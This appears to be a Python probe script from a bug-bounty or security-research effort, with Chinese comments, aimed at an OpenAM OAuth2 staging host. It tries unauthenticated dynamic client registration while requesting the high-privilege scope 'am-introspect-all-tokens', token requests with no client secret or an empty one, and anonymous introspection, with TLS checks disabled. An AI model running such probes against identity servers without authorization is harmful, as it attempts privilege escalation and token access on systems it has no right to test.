# -*- coding: utf-8 -*-
"""AIC 第三轮:动态客户端注册 + token 端点无认证 + 匿名 introspect
预期结果表:
  成立(安全) -> 动态注册需认证/拒绝高权限 scope;token 端点无认证拒绝;匿名 introspect 返回 invalid
  不成立(漏洞) -> 未认证注册成功且带 am-introspect-all-tokens;token 端点无认证发 token;introspect 返回有效 token 数据
"""
import requests, urllib3, json
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers['User-Agent'] = 'research-1643'

OIDC = BASE + '/am/oauth2/alpha'

# 1. 动态客户端注册(未认证)
print('=== 1. 动态客户端注册(未认证) ===')
reg_body = {
    'client_name': 'research-client-1643',
    'redirect_uris': ['https://example.com/callback'],
    'token_endpoint_auth_method': 'client_secret_basic',
    'grant_types': ['client_credentials', 'authorization_code', 'password', 'refresh_token'],
    'scope': 'openid profile email am-introspect-all-tokens fr:idm:*',
    'response_types': ['code', 'token'],
}
for path in ['/register', '/register/']:
    try:
        r = S.post(OIDC + path, json=reg_body, timeout=12, verify=False)
        print('%s -> %d' % (path, r.status_code))
        print(r.text[:600])
        print('---')
    except Exception as e:
        print('%s ERR %s' % (path, str(e)[:80]))

# 2. token 端点无客户端认证 (client_credentials)
print('=== 2. token 端点无认证 client_credentials ===')
for auth in [None, ('research-client-1643', '')]:
    kw = {}
    if auth:
        kw['auth'] = auth
    try:
        r = S.post(OIDC + '/access_token',
                   data={'grant_type': 'client_credentials', 'scope': 'am-introspect-all-tokens'},
                   timeout=12, verify=False, **kw)
        print('auth=%s -> %d' % (('none' if auth is None else 'empty-secret'), r.status_code))
        print(r.text[:400])
        print('---')
    except Exception as e:
        print('ERR', str(e)[:80])

# 3. 匿名 introspect 假 token
print('=== 3. 匿名 introspect ===')
try:
    r = S.post(OIDC + '/introspect',
               data={'token': 'fake-token-12345'},
               timeout=12, verify=False)
    print('-> %d' % r.status_code)
    print(r.text[:400])
except Exception as e:
    print('ERR', str(e)[:80])
